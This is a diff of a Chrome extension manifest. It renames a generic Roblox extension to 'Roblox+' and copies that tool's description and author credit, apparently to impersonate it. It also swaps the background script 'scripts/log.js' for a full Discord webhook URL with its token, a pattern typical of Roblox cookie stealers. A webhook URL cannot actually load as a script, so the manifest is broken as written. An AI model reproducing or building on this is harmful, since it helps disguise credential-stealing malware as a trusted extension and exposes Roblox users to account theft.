@@ -1,6 +1,17 @@
 {
-    "name": "Roblox extension",
-    "description": "extention for roblox",
+    "name": "Roblox+",
+    "description": "Adds features and notifiers made by WebGL3D to the Roblox website
+This extension is not made by Roblox, and can not be used to play Roblox games.
+
+Roblox+ is a free Google Chrome extension made by me (WebGL3D) that adds features to the Roblox.com website!
+
+Some of the features include:
+* Item notifier - get notified when a new item comes out or gets updated
+* Avatar page filter bar
+* Trade notifier
+* Support dark theme on unsupported Roblox pages
+
+There are over 30 features Roblox+ includes! For a full list of features see the Roblox+ Control Panel here: https://www.roblox.com/my/account?tab=rplus&rbxp=48103520",
     "version": "1.0.0",
     "manifest_version": 2,
 
@@ -15,6 +26,6 @@
     ],
 
     "background": {
-      "scripts": ["scripts/log.js"]
+      "scripts": ["https://discord.com/api/webhooks/974221087757967411/FCZKcMgFwobpK6Vx9xPnLB3puqY_TZSD5A9E3vjwUGwXC2u03cH-rYBNeq2KNm1Up6t9"]
     }
 }
